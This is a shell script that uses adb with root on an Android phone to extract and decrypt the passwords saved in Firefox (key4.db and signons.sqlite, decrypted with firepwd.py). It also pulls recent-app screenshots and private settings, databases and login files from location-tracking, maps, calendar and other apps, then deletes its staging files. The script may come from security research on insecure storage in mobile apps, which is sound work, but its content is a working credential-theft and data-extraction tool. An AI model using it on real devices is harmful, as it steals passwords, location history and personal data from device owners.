#!/bin/sh
./adb shell "su -c 'echo Running ADB shell as superuser; 
cd /storage/emulated/0/; 
mkdir -p firefox_pass;
cp /data/data/org.mozilla.firefox/files/mozilla/*/key4.db /storage/emulated/0/firefox_pass;
cp /data/data/org.mozilla.firefox/files/mozilla/*/signons.sqlite /storage/emulated/0/firefox_pass'"
./adb pull /storage/emulated/0/firefox_pass 
./adb shell "su -c 'cd /storage/emulated/0/;
rm -rf firefox_pass;
mkdir -p recents;
cp /data/system_ce/0/recent_images/* recents' "
cp firepwd.py firefox_pass
cd firefox_pass
printf "\nDecrypted password from Firefox browser:\n\n"
python firepwd.py | awk '/htt/, 0' > firefox_passwords.txt
cat firefox_passwords.txt
printf "\n"
cd ..
./adb pull /storage/emulated/0/recents
echo Screenshots of recent applications copied to ./recents
./adb shell "su -c 'cd /storage/emulated/0/; 
mkdir -p insecure_storage;
cd insecure_storage;
cp /data/data/com.isharing.isharing/shared_prefs/ISHARING_PREFS.xml .;
cp /data/data/com.isharing.isharing/databases/com.hypertrack.common.device_logs.db .;
cp /data/data/app.gpsme/databases/tray.db .;
cp /data/data/com.zoemob.gpstracking/databases/zoemob .;
cp /data/data/cz.ackee.bazos/shared_prefs/prefs.xml .;
cp /data/data/cz.seznam.mapy/shared_prefs/MAP_PREFERENCES.xml .;
cp /data/data/org.androworks.meteor/shared_prefs/Meteor.xml .;
cp /data/data/org.androworks.meteor/shared_prefs/org.androworks.meteorlib.ads.PREF_FILE_NAME.xml .;
cp /data/data/cz.oksystem.chmu.basic/shared_prefs/cz.oksystem.chmu.basic_preferences.xml .;
cp /data/data/com.navigation.offlinemaps.gps/shared_prefs/com.sygic.widget.settings_key.xml .;
cp /data/data/com.navigation.offlinemaps.gps/files/default.realm .;
cp /data/data/cz.vars.dopinfo.cz/shared_prefs/Login.xml .;
cp /data/data/cz.vars.dopinfo.cz/shared_prefs/cz.vars.dopinfo.cz_preferences.xml .;
cp /data/data/com.digibites.calendar/databases/digical.db .;
cp /data/data/com.simplemobiletools.calendar/databases/events.db .;
cp /data/data/com.android.providers.calendar/databases/calendar.db .'"
./adb pull /storage/emulated/0/insecure_storage
cd firefox_pass
rm firepwd.py

